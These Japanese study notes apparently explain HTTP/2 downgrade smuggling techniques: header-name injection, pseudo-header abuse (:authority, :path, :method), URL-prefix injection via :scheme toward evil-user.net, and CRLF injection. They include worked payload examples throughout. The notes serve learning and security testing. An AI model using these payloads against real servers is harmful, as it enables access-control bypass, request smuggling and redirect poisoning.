## ヘッダー名を介した注入

###### `:`は名前の終了を示さない

- HTTP/1では`:`は名前の終了を示す
- HTTP/2ではそうではない

###### ヘッダー名を介した注入方法( `:`と`\r\n`の組合せ)

- HTTP/2ヘッダの名前フィールド(ヘッダ名を入力する箇所)を使って、他のヘッダをこっそり注入できる
- フロントエンド(HTTP/2)
```
foo: bar\r\nTransfer-Encoding: chunked\r\nX:	ignore
```
- ↓ バックエンド(HTTP/1)
```http
Foo: bar\r\n
Transfer-Encoding: chunked\r\n
X: ignore\r\n
```

## 擬似ヘッダを使った注入

- 擬似ヘッダの操作には、InspectorのRequest headersを使用する。
- [2. HTTP2専用のベクターとCRLF注入によるHRS](2.%20HTTP2専用のベクターとCRLF注入によるHRS.md#改行(CRLF)の注入)は">"をクリックし、Shift + Enterで`\r\n`を注入する
 ![[Pasted image 20240130161056.png | 200]]

###### 擬似ヘッダの種類

- `:method` : リクエストメソッド
- `:path` : クエリストリングも含めたリクエストパス
- `:authority` : HTTP/1の`Host`ヘッダのようなもの
- `:scheme` : リクエストスキーム(`http`や`https`等)
- `:status` : レスポンス用のステータスコード
![[Pasted image 20240129160634.png]]

###### 擬似ヘッダとは

- HTTP/2はHTTP/1と異なり、リクエスト行やレスポンスのステータス行を使用しない
- その代わり、`:`をつけた「擬似ヘッダ」を使ってそのようなデータを渡す
- リクエストをHTTP/1にダウングレードするとき、リクエスト行を動的に構築するために、以下の擬似ヘッダのいくつかの値を使用する。
- これにより、いくつかの興味深い新しい攻撃方法が可能になる

---
### 任意のホスト名の入力

- `:authority`を使用
- HTTP/2では`Host`ヘッダも使用可能
- 2つのHost名でHost header attackのように、セキュリティをバイパスできる可能性がある([2. HHI脆弱性の検出](../../HTTP%20Host%20header%20attacks/2.%20HHI脆弱性の検出.md))

---
### 任意のリクエストパスの入力

- `:path`を使用
- 2つの異なるパスでリクエストを送信することが可能

| :method | POST |
| ---- | ---- |
| :path | /anything |
| :path | /admin |
| :authority | vulnerable-website.com |
- `:path`の解釈に不一致がある場合、本来ならアクセス禁止のエンドポイント(`/admin`等)にアクセスできるかも

---
### リクエスト行の注入

- `:method`を使用
- サーバが`:method`の値にスペースを許可した場合、本来とは全く異なるリクエスト行を注入できるかも
###### フロントエンド(HTTP/2)
| :method | GET /admin HTTP/1.1 |
| ---- | ---- |
| :path | /anything |
| :authority | vulnerable-website.com |
###### バックエンド(HTTP/1)
```http
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vulnerable-website.com
```

- バックエンドがリクエスト行の末尾にある余計な文字（`/anything HTTP/1.1`）を許容する場合、リクエストのパスが曖昧になる
- その結果、攻撃者はサーバに対して不正なリクエストを行うことができるかも

---
### URL prefixの注入

- `:scheme`を使用。本来は`http`や`https`を指定
- サーバが`:scheme`の値で動的にURLを生成する場合
	- URLプレフィックス(前にあるもの)を追加する
	- 本来のURLをクエリ文字列に追いやることで完全に上書き等が可能に

###### リクエスト
| :method | GET |
| ---- | ---- |
| :path | /anything |
| :authority | vulnerable-website.com |
| :scheme | `https://evil-user.net/poison?` |
###### レスポンス
| :status | 301 |
| ---- | ---- |
| location | `https://evil-user.net/poison?://vulnerable-website.com/anything/` |

### 改行(CRLF)の注入

###### 前提：HTTP/1での改行の扱い

- リクエスト行はメソッド、パス、HTTP/1.1によって構成され、それぞれの間にはスペースが入る。最後に`\r\n`でリクエスト行は終了する

###### 方法

- `:path`、または`:method`を使用
- `\r\n`を不正に挿入してリクエスト行を操作する。任意のヘッダも注入可能。

- ==⚠️==単純に`\r\n`を注入してはリクエスト行が破綻するため、リクエスト行の文法を守ること
```
<method> + space + <path> + space + HTTP/1.1
```
- 上記の文法上で自身がどこに注入するかをイメージしそれに従って残りのパーツを含めるだけでいい
	- 例えば、`<path>`の部分に`:path`で注入する場合、` HTTP/1.1`を追加してから`\r\n`を追加する

- ダミーのヘッダ(`X:x`等）も追加すること。
	- ダウングレード時に自動で付与される`HTTP/1.1`によって注入内容の解釈が邪魔されないように

###### フロントエンド(HTTP/2)
| :method | GET |
| ---- | ---- |
| :path | `/example HTTP/1.1\r\n Transfer-Encoding: chunked\r\n X: x` |
| :authority | vulnerable-website.com |
###### バックエンド(HTTP/1)
```http
GET /example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```
- `X: x`までが`:path`で注入されたリクエストパス
- `X: x`がダミーのヘッド
